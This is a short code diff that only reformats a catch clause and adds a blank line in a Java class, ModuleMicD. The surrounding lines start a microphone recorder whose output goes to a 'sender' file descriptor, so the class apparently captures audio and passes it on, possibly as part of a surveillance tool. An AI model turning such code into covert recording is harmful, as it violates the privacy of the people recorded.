@@ -129,7 +129,7 @@ public class ModuleMicD extends ModuleMic {
 			recorder.setOutputFile(sender.getFileDescriptor());
 			recorder.prepare();
 			recorder.start(); // Recording is now started
-		}catch (Exception e){
+		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
@@ -242,6 +242,7 @@ public class ModuleMicD extends ModuleMic {
 		}
 		suspend();
 	}
+
 	@Override
 	public String getTag() {
 		return TAG;
